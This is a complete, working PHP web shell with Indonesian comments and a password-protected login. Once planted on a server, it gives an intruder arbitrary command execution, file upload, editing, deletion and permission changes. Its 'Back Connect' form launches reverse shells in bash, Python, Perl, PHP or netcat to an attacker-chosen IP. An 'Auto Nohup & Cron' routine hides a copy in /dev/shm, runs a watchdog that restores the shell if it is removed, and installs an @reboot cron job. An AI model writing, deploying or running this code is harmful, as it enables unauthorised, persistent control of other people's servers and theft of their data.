<?php
// Recode?you kontol,apa sush nya tinggl pake doang
//nemu bug?ingfo t.me/OutsidersReal
error_reporting(0);
session_start();
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    if (isset($_POST['password'])) {
        $passwordHash = '$2a$12$xEWV.dIX4sg/1qJ/JE63je63swfa4YD0kvYuD9MgL009GoadAlkXC'; 

        if (password_verify($_POST['password'], $passwordHash)) {
            $_SESSION['loggedin'] = true;
            echo '<script type="text/javascript">
            window.location = "' . $_SERVER['PHP_SELF'] . '"
            </script>';
        } else {
            echo 'password salah!';
        }
    }

    ?>
    <!DOCTYPE html>
<html>
<head>
    <title>nyari apa ker?</title>
    <link href="https://fonts.googleapis.com/css?family=Montserrat&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body { 
            font-family: 'Montserrat', sans-serif; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            background-color: #1e1e1e; 
            margin: 0; 
            padding: 0; 
        }
        .login-container { 
            max-width: 400px; 
            width: 100%; 
            padding: 20px; 
            border: 1px solid #ddd; 
            background-color: #222; 
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); 
            border-radius: 10px; 
            text-align: center; 
        }
        .login-container h3 { 
            margin-bottom: 20px; 
            color: #00ff99; 
        }
        .login-container input[type="password"] { 
            width: 100%; 
            padding: 10px; 
            margin: 10px 0; 
            border: 1px solid #ccc; 
            border-radius: 5px; 
            box-sizing: border-box; 
            background-color: #333; 
            color: #fff; 
        }
        .login-container button { 
            background-color: #00ff99; 
            color: black; 
            padding: 10px 20px; 
            border: none; 
            border-radius: 5px; 
            cursor: pointer; 
            width: 100%; 
            font-size: 16px;
        }
        .login-container button:hover { 
            background-color: #00cc66; 
            color: white; 
        }
        button {
    background: #00ff99;
    color: black;
    border: none;
    padding: 5px 10px;
    cursor: pointer;
    text-shadow: 0 0 1px #00ff99, 0 0 2px #00cc66;
}

button:hover {
    background: #00cc66;
    text-shadow: 0 0 1px #00cc66, 0 0 2px #00ff99;
}

button.auto-cronjob {
    background: #00ff99; 
}

button.auto-cronjob:hover {
    background: #00cc66; 
}

    </style>
</head>
<body>
    <div class="login-container">
        <h3>bukan penikung biasa</h3>
        <form method="POST">
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit"><i class="fas fa-sign-in-alt"></i> Login</button>
        </form>
    </div>
</body>
</html>

    <?php
    exit;
}

$cwd = isset($_GET['d']) ? urldecode($_GET['d']) : getcwd();
chdir($cwd);


if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

function add_nohup_backup_persistent() {
    $current_file = realpath($_SERVER['SCRIPT_FILENAME']);
    $backup_path = "/dev/shm/.hidden_backup.php";
    $php_path = trim(shell_exec("which php"));
    $checker_script = "/dev/shm/.checker.php";

    if (!file_exists($backup_path)) {
        copy($current_file, $backup_path);
    }

    
    $checker_code = <<<PHP
<?php
\$t = "$current_file";
\$b = "$backup_path";
while (true) {
    if (!file_exists(\$t) || md5_file(\$t) !== md5_file(\$b)) {
        copy(\$b, \$t);
    }
    sleep(1);
}
PHP;

    
    file_put_contents($checker_script, $checker_code);

    
    $running = shell_exec("ps aux | grep '$checker_script' | grep -v grep");
    if (empty($running)) {
        shell_exec("nohup $php_path $checker_script > /dev/null 2>&1 &");
    }

    
    $reboot_cron = "@reboot nohup $php_path $checker_script > /dev/null 2>&1";
    $current_cron = shell_exec("crontab -l 2>/dev/null");

    if (strpos($current_cron, $reboot_cron) === false) {
        $current_cron .= $reboot_cron . "\n";
        file_put_contents("/tmp/mycron", $current_cron);
        shell_exec("crontab /tmp/mycron && rm /tmp/mycron");
    }
}


if (isset($_POST['auto_cronjob'])) {
    add_nohup_backup_persistent();
    echo "<pre>✅ Cron @reboot & nohup aktif! Bekdor akan hidup terus setelah reboot & jika dihapus.</pre>";
}


function is_dir_writable($path) {
    return is_writable($path) && is_dir($path);
}

echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Ssssttt</title>
<meta name="robots" content="noindex, nofollow">
<style>
h2 { color: #00ff99; text-align: center; text-shadow: 0 0 1px #00ff99, 0 0 2px #00cc66; }
body { background: #1e1e1e; color: #ddd; font-family: "Courier New", monospace; margin: 0; padding: 20px; text-shadow: 0 0 1px #888; }
a { color: #00ccff; text-decoration: none; text-shadow: 0 0 1px #00ccff, 0 0 2px #888; }
button { background: #00ff99; color: #000; border: none; padding: 5px 10px; cursor: pointer; text-shadow: 0 0 1px #00ff99, 0 0 2px #00cc66; }
button:hover { background: #00cc66; text-shadow: 0 0 1px #00cc66, 0 0 2px #00ff99; }
table { width: 100%; border-collapse: collapse; margin-top: 20px; }
th, td { padding: 10px; border-bottom: 1px solid #444; text-align: left; }
input, select { background: #222; color: #fff; border: 1px solid #555; padding: 5px 10px; }
pre { background: #111; padding: 10px; overflow-x: auto; border: 1px solid #444; }
footer { text-align: center; font-size: 12px; margin-top: 30px; color: #888; }
</style>
</head><body>';

echo '<h2><img src="https://camo.githubusercontent.com/1cc478d6ea38eab530acb98124c749dba0c5b19294bee0ee4bd6169ae4f5639d/68747470733a2f2f6d656469612e67697068792e636f6d2f6d656469612f336f456a4857706956494f475854356c396d2f67697068792e676966" width="200" height="200"></h2>';
echo "<b>Server IP:</b> " . $_SERVER['SERVER_ADDR'] . "<br>";
echo "<b>Server Domain:</b> " . $_SERVER['SERVER_NAME'] . "<br>";
echo "<b>Web Server:</b> " . $_SERVER['SERVER_SOFTWARE'] . "<br>";
echo "<b>User:</b> " . get_current_user() . " | ";
echo "<b>OS:</b> " . php_uname() . "<br>";
echo "<b>Current Path:</b> ";
$parts = explode(DIRECTORY_SEPARATOR, trim($cwd, DIRECTORY_SEPARATOR));
$build = "";
echo "<a href='?d=" . urlencode(DIRECTORY_SEPARATOR) . "' style='color: #00ff99;'>📁</a>" . DIRECTORY_SEPARATOR;
foreach ($parts as $part) {
    $build .= DIRECTORY_SEPARATOR . $part;
    echo "<a href='?d=" . urlencode($build) . "' style='color: #00ff99;'>"; 
    echo "<i class='fas fa-folder' style='color: #00ff99;'></i> "; 
    echo htmlspecialchars($part) . "</a>" . DIRECTORY_SEPARATOR;
}
echo "<hr><h3>Back Connect</h3>";
echo "<form method='POST'>
<b>IP: </b><input type='text' name='bc_ip' placeholder='Your IP' required>
<b>Port: </b><input type='text' name='bc_port' placeholder='Port' required>
<select name='bc_type'>
    <option value='bash'>Bash</option>
    <option value='python'>Python</option>
    <option value='perl'>Perl</option>
    <option value='php'>PHP</option>
    <option value='nc'>Netcat</option>
</select>
<button type='submit' name='bc_start'>Connect</button>
</form>";

if (isset($_POST['bc_start']) && !empty($_POST['bc_ip']) && !empty($_POST['bc_port'])) {
    $ip = $_POST['bc_ip'];
    $port = $_POST['bc_port'];
    $type = $_POST['bc_type'];

    $cmd = '';
    switch ($type) {
        case 'bash':
            $cmd = "bash -i >& /dev/tcp/$ip/$port 0>&1";
            break;
        case 'python':
            $cmd = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\"])'";
            break;
        case 'perl':
            $cmd = "perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'";
            break;
        case 'php':
            $cmd = "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
            break;
        case 'nc':
            $cmd = "nc $ip $port -e /bin/sh";
            break;
    }

    echo "<pre>⏳ Mencoba connect via $type to $ip:$port...</pre>";
    shell_exec("$cmd > /dev/null 2>&1 &");
}

echo "<hr>";

echo "<a href='?logout=true'><button>Logout</button></a>
      <form method='POST' style='display:inline;'>
        <button type='submit' name='auto_cronjob' class='auto-cronjob'>Auto Nohup & Cron</button>
      </form>
      <hr>";


echo "<form method='POST'>
<b>Create: </b>
<input type='text' name='newname' placeholder='Filename or Folder Name'>
<select name='type'>
    <option value='file'>File</option>
    <option value='folder'>Folder</option>
</select>
<button type='submit' name='create'>Create</button>
</form><br>";

if (isset($_POST['create']) && !empty($_POST['newname'])) {
    $name = basename($_POST['newname']);
    $path = $cwd . DIRECTORY_SEPARATOR . $name;
    if ($_POST['type'] === 'file') {
        file_put_contents($path, '');
    } else {
        mkdir($path);
    }
}


if (isset($_POST['terminal_cmd'])) {
    echo "<h3>Outpu7</h3><pre>";
    $cmd = $_POST['terminal_cmd'];
    $output = shell_exec("cd " . escapeshellarg($cwd) . " && $cmd 2>&1");
    echo htmlspecialchars($cmd) . "\n" . htmlspecialchars($output);
    echo "</pre><hr>";
}

echo "<form method='POST'>
<input type='text' name='terminal_cmd' size='80' placeholder='ls -la,id,whoami,etc...'>
<button type='submit'>Execu7e</button>
</form><hr>";


if (isset($_FILES['file'])) {
    $upload = move_uploaded_file($_FILES['file']['tmp_name'], $cwd . DIRECTORY_SEPARATOR . $_FILES['file']['name']);
    echo $upload ? "<pre>✅ Uploaded: " . htmlspecialchars($_FILES['file']['name']) . "</pre>" : "<pre>❌ Upload failed</pre>";
}

echo "<form method='POST' enctype='multipart/form-data'>
<input type='file' name='file'>
<button type='submit'>Upload</button>
</form><hr>";
if (isset($_GET['edit'])) {
    $edit_file = realpath($cwd . DIRECTORY_SEPARATOR . $_GET['edit']);

    
    if ($edit_file === false || strpos($edit_file, $cwd) !== 0) {
        echo "<pre>❌ Akses ditolak.</pre><hr>";
    } elseif (is_file($edit_file)) {
        
        if (isset($_POST['edit_file']) && isset($_POST['new_content'])) {
            file_put_contents($edit_file, $_POST['new_content']);
            echo "<pre>✅ File berhasil disimpan.</pre><hr>";
        }

        
        $content = htmlspecialchars(file_get_contents($edit_file));
        echo "<h3 style='color:#0f0;'>📝 Edit File: " . htmlspecialchars($_GET['edit']) . "</h3>";
        echo "<form method='POST'>
            <textarea name='new_content' rows='20' style='width:100%; background:#111; color:#0f0;'>$content</textarea>
            <input type='hidden' name='edit_file' value='" . htmlspecialchars($edit_file) . "'>
            <br><button type='submit' style='margin-top:5px;'>💾 Save</button>
        </form><hr>";
    } else {
        echo "<pre>❌ Ini folder bre, klo mau rename pake yang satunya.</pre><hr>";
    }
}

if (isset($_GET['rename'])) {
    $old_name = basename($_GET['rename']);
    $old_path = $cwd . DIRECTORY_SEPARATOR . $old_name;

    if (file_exists($old_path)) {
        echo "<h3>Rename: " . htmlspecialchars($old_name) . "</h3>
        <form method='POST'>
            <input type='text' name='newname' value='" . htmlspecialchars($old_name) . "' required>
            <input type='hidden' name='oldname' value='" . htmlspecialchars($old_path) . "'>
            <button type='submit'>Rename</button>
        </form><hr>";
    } else {
        echo "<pre>❌ File/Folder tidak ditemukan</pre><hr>";
    }
}

if (isset($_POST['newname']) && isset($_POST['oldname'])) {
    $new_path = $cwd . DIRECTORY_SEPARATOR . basename($_POST['newname']);
    if (rename($_POST['oldname'], $new_path)) {
        echo "<pre>✅ Berhasil di-rename ke " . htmlspecialchars($_POST['newname']) . "</pre><hr>";
    } else {
        echo "<pre>❌ Gagal rename!</pre><hr>";
    }
}


function file_controls($item, $cwd, $is_dir) {
    $full = $cwd . DIRECTORY_SEPARATOR . $item;
    $perm = substr(sprintf('%o', fileperms($full)), -4);
    $perm_color = is_writable($full) ? "<span style='color:green;'>$perm</span>" : "<span style='color:red;'>$perm</span>";
    $owner_id = fileowner($full);
    $group_id = filegroup($full);
    $owner = function_exists('posix_getpwuid') ? posix_getpwuid($owner_id)['name'] : $owner_id;
    $group = function_exists('posix_getgrgid') ? posix_getgrgid($group_id)['name'] : $group_id;
    $actions = "[<a href='?d=$cwd&edit=$item' style='color:" . (is_writable($full) ? 'green' : 'red') . "' title='Edit'>✏️</a>] 
                [<a href='?d=$cwd&rename=$item' style='color:" . (is_writable($full) ? 'green' : 'red') . "' title='Rename'>🔄</a>] 
                [<a href='?d=$cwd&delete=$item' style='color:" . (is_writable($full) ? 'green' : 'red') . "' onclick='return confirm(\"Are you sure you want to delete this item?\")' title='Delete'>🗑️</a>] 
                [<a href='?d=$cwd&chmod=$item' style='color:" . (is_writable($full) ? 'green' : 'red') . "' title='CHMOD'>⚙️</a>]";

    $icon = $is_dir ? "📁" : "📄";
$link = $is_dir
    ? "?d=" . urlencode($full) 
    : "?d=" . urlencode($cwd) . "&edit=" . urlencode($item); 

return "<tr><td><a href='$link' style='color:white;'>$icon $item</a></td>
        <td>" . ($is_dir ? 'Dir' : 'File') . "</td>
        <td>$perm_color</td>
        <td>$owner/$group</td>
        <td>$actions</td>
    </tr>";

}

$items = scandir($cwd);
$dirs = $files = [];
foreach ($items as $item) {
    if ($item === '.') continue;
    if (is_dir($item)) $dirs[] = $item;
    else $files[] = $item;
}
if (isset($_GET['delete'])) {
    $target = $cwd . DIRECTORY_SEPARATOR . $_GET['delete'];
    if (is_file($target)) {
        if (unlink($target)) {
            echo "<pre>✅ File berhasil dihapus!</pre>";
        } else {
            echo "<pre>❌ Gagal menghapus file!</pre>";
        }
    } elseif (is_dir($target)) {
        if (rmdir($target)) {
            echo "<pre>✅ Folder berhasil dihapus!</pre>";
        } else {
            echo "<pre>❌ Gagal menghapus folder! Pastikan folder kosong.</pre>";
        }
    }
}
if (isset($_GET['chmod'])) {
    $target = $cwd . DIRECTORY_SEPARATOR . $_GET['chmod'];
    if (file_exists($target)) {
        echo "<h3>CHMOD: " . htmlspecialchars($_GET['chmod']) . "</h3>
        <form method='POST'>
            <input type='text' name='chmod_val' placeholder='Contoh: 0755' required>
            <input type='hidden' name='chmod_file' value='" . htmlspecialchars($target) . "'>
            <button type='submit'>Set CHMOD</button>
        </form><hr>";
    } else {
        echo "<pre>❌ Target tidak ditemukan!</pre><hr>";
    }
}

if (isset($_POST['chmod_val']) && isset($_POST['chmod_file'])) {
    $mode = intval($_POST['chmod_val'], 8);
    if (chmod($_POST['chmod_file'], $mode)) {
        echo "<pre>✅ CHMOD berhasil diubah ke " . htmlspecialchars($_POST['chmod_val']) . "</pre><hr>";
    } else {
        echo "<pre>❌ Gagal mengubah CHMOD</pre><hr>";
    }
}

echo "<table><tr><th>Name</th><th>Type</th><th>Permission</th><th>Owner/Group</th><th>Action</th></tr>";

foreach ($dirs as $dir) {
    echo file_controls($dir, $cwd, true);
}

foreach ($files as $file) {
    echo file_controls($file, $cwd, false);
}

echo "</table><footer><a href='https://www.anonsec-team.org' target='_blank'>Touch Me</a></footer></body></html>";
?>
